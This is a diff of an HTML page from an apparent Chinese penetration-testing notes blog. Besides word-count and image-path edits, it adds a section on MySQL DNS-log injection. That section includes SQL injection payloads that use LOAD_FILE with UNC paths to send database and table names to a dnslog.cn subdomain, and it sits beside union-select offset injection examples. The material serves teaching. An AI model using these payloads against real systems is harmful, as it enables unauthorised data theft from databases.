@@ -635,14 +635,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        5.8k
+                        6.5k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        21 分
+                        24 分
                     </div>
                     
                 
@@ -1027,9 +1027,7 @@ id=1 %5d%5c' union select 1,2,table_name from information_schema tables where ta
 <h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p><em>：在数据库中\</em>代表一切</p>
 <p>库.表：表示选中这个库里面这个表</p>
 <p>admin.*：代表admin表中所有字段</p>
-<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="C:%5CUsers%5Csamedi%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200803083651627.png" alt="image-20200803083651627"></p>
-<br>
-
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/1.png" alt=""></p>
 <p>假如我们要注入的这个页面，用order by 查到显示这个页面的表中有10个字段，然后知道了有一个叫admin的表，如果这个admin表中有2个字段，那么就要用</p>
 <pre><code>union select 1,admin.*,4,5,6,7,8,9,10 from admin</code></pre><p>假设admin表中有7个字段=&gt;a,b,c,d,e,f,g</p>
 <pre><code>union select 1,2,3,4,5,6,7,8,9,10 from admin        #正常这样判断显错位
@@ -1044,6 +1042,32 @@ select 1,admin*,9,10 from admin        #可以获得c,d,e
 select admin.*,8,9,10 from admin    #可以获得d,e,f</code></pre><p>偏移注入就是有这样的局限性，因为显错位不够，导致g无法显示了，如果原本要查询的这个页面的数据库中的表的字段越多，显示位越多，偏移注入就越多，当然可能并不是所有的字段内容都是对我们有用的。</p>
 <p>有的显错位并不一定那么明显的显示在页面中，有可能在这个页面的图片中的html源码里</p>
 <p>偏移注入用sqlmap是跑不出来的，所以遇到了还是自己手注的好</p>
+<h2 id="MySQL注入——DNS注入"><a href="#MySQL注入——DNS注入" class="headerlink" title="MySQL注入——DNS注入"></a>MySQL注入——DNS注入</h2><p>Dns log【Dns日志注入】</p>
+<h3 id="Dns-Log使用场景："><a href="#Dns-Log使用场景：" class="headerlink" title="Dns Log使用场景："></a>Dns Log使用场景：</h3><p>在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起请求，这儿是后可以通过DNS请求把想获得的数据外带出来。对于sql盲注，常用的方法就是二分法去一个个猜，但是这样的方法麻烦不说，还很容易因为数据请求频繁导致被ban。所以可以将select到的数据发送给一个url，利用dns解析产生的记录日志来查看数据。</p>
+<h3 id="DNS日志的作用："><a href="#DNS日志的作用：" class="headerlink" title="DNS日志的作用："></a>DNS日志的作用：</h3><p>是因为网站没有回显点，只能用盲注的方法，可能盲注都做不了，ton故宫这种外在的方法来显示。</p>
+<p>核心：将盲注转换成显错注入</p>
+<br>
+
+<p>LOAD_FILE()：读取文件的函数，仅限于MySQL数据库</p>
+<p>读取文件并返回文件内容为字符串，要使用此函数，<strong>文件必须位于服务器主机上</strong>，必须指定完整路径的文件，并且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_allowed_packet（限制server接收的数据包大小函数，默认1MB）。如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回NULL</p>
+<p><strong>默认情况下，load_file()函数是不支持的，需要修改MySQL文件夹下的my.ini文件，在文件最后一行加上secure_file_priv=</strong></p>
+<p>有些开发而可能会偷懒采用这个方法来加载一些外部文件，才会开启它。</p>
+<h3 id="UNC路径："><a href="#UNC路径：" class="headerlink" title="UNC路径："></a>UNC路径：</h3><p>就像是NFS共享文件夹那样要输入的</p>
+<p>\\192.168.1.1</p>
+<p>DNS注入时因为转义的原因，反斜杠可能要写4个，所以正斜杠会更好//192.168.1.1</p>
+<br>
+
+<p>UNC路径其实是windows有个叫SMB的服务，我们控制它去请求一些数据</p>
+<p>例：//a.1806dl.dnslog.cn/abc</p>
+<p>访问1806dl.dnslog.cn下的abc共享文件夹</p>
+<p>Linux系统默认没有smb服务，</p>
+<p>这个域名一定是他公司内网所解析不了的</p>
+<br>
+
+<p>dnslog.cn平台可以帮助我们随机获取一个域名，在这个平台就可以显示我们想要的dns日志</p>
+<p>例：</p>
+<pre><code>and load_file(concat('//',(select database()),'3u501d.dnslog.cn//abc')) -- qwe</code></pre><p>3u501d.dnslog.cn是在dnslog.cn平台随机获取的域名，abc是要查的文件夹，写什么都可以，上面这条语句可以帮助我们获得库名</p>
+<pre><code>and load_file(concat('//',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'3u501d.dnslog.cn//abc')) -- qwe</code></pre><p>通过GET传参或者其他什么传参都可以</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -1790,7 +1814,7 @@ select admin.*,8,9,10 from admin    #可以获得d,e,f</code></pre><p>偏移注�
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">5.9k</span> 字
+                <span class="white-color">6.6k</span> 字
             
 
             
